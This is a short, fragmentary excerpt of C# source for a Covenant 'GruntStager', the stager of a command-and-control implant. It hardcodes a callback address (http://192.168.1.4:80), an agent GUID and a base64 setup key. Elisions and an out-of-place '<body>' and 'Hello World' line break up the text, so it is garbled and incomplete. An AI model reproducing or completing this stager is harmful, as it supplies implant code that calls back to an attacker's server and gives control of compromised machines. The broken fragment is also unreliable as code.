...
namespace GruntStager
{
    public class GruntStager
    {
        ...
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"http://192.168.1.4:80".Split(',').ToList();
    ...
    <body>
        ...
        // Hello World! {0}
                ...
                string aGUID = @"e8c8ebf4c4";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"1iKd9QV1OOTgjmQxEeoZ0NpMfpJYaD8LDCa01oDkeEQ=");
